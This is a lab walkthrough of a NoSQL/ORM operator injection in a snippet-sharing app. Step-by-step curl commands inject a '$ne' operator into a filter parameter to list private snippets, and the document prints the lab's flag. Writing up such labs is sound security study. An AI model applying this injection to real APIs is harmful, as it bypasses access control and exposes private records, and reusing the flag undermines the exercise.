# copypasta-010 - BugForge Lab Walkthrough

**URL:** https://lab-1784365471420-lauids.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** NoSQL/ORM Operator Injection via "Advanced Field Filter" - Access Control Bypass
**Flag:** `bug{ozEqnvKrEWOTrXKlcHe4f8rtvQdOtIFR}`

---

## Summary

CopyPasta is a code-snippet sharing app (same family as copypasta-003/006/008/009). This instance
adds an "advanced field filter" feature to `GET /api/snippets/public`, documented by the app's own
seeded snippet (id 8, "CopyPasta search API - notes"): `filter[language]=python`,
`filter[title]=...`. The filter object is passed straight into a query-builder/ORM `where` clause
without validating that keys are plain scalar values. Supplying a Sequelize/Mongo-style operator
key (`filter[is_public][$ne]=1`) turns the filter into `is_public != 1`, which, combined with the
endpoint's base assumption that it "only ever lists public snippets," returns every non-public
snippet instead, including the admin's private snippet with the flag embedded in the JSON.

## Tech Stack

React SPA (CRA), Express.js, JWT auth, SQLite-backed but filter parsing behaves like a Sequelize
`where` object (accepts operator sub-keys), snippet/collection sharing via UUID `share_code`.

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | none | returns JWT directly, no login step needed |
| `GET /api/snippets/public` | JWT | lists only `is_public:1` snippets, intended |
| `GET /api/snippets/public?filter[field]=value` | JWT | documented "advanced filter", vulnerable |
| `GET /api/snippets/raw/:id` | JWT | raw snippet content, IDOR-safe in this instance (404s on private ids not owned) |

## Attack Chain

**1. Register (no login needed, token returned directly)**
```bash
curl -s -X POST $TARGET/api/register -H "Content-Type: application/json" \
  -d '{"username":"pentest1","email":"pentest1@test.com","password":"Password123!","full_name":"Pentest One"}'
```

**2. List the public snippets**
```bash
curl -s $TARGET/api/snippets/public -H "Authorization: Bearer $TOKEN"
```
Snippet id 8 ("CopyPasta search API - notes") documents an advanced filter feature:
```
GET /api/snippets/public?filter[language]=python
GET /api/snippets/public?filter[title]=Fetch API Helper
```

**3. Inject an ORM operator into the filter key instead of a scalar value**
```bash
curl -s -G "$TARGET/api/snippets/public" \
  --data-urlencode 'filter[is_public][$ne]=1' \
  -H "Authorization: Bearer $TOKEN"
```
Returns 9 snippets instead of 7, including id 9 ("infra runbook (private)", admin) and id 4
("Password Generator (private)", pythonista), both normally excluded from `/public`. Snippet id 9
carries a `flag` field directly in the JSON response.

## Discovery Notes

The seeded "search API notes" snippet documents the vulnerable parameter shape
(`filter[field]=value`) as if it were a normal feature. The vulnerability itself was found by
testing whether the filter object accepts an operator key instead of a literal value, a classic
NoSQL/Sequelize-style injection, distinct from SQLi, since it exploits how the filter object is
deserialized into a `where` clause rather than string concatenation into raw SQL.

## Dead Ends

| Attempt | Result | Lesson |
|---|---|---|
| `GET /api/snippets/raw/4` (private, unowned) | 404 "Snippet not found" | raw endpoint correctly scoped in this instance |
| `filter[is_public]=0` (plain value) | empty array | filter is exact-match by default, the bug needs an operator key, not just any value |

## Root Causes

- The "advanced field filter" feature passes user-controlled JSON keys straight into an
  ORM/query-builder `where` object without an allowlist of permitted operators or field-value
  types (CWE-943-adjacent: improper neutralization of special elements in a data query).
- `is_public` filtering is treated as just another user-filterable field rather than a
  server-enforced constraint applied after or independent of user filters.
- The endpoint's implicit security invariant ("only ever lists public snippets") is enforced by
  application logic that the same injectable filter object can override.

## CWE / OWASP

CWE-943 (Improper Neutralization of Special Elements in Data Query Logic) / OWASP A01:2021,
Broken Access Control (server-side filter bypass exposing private records).
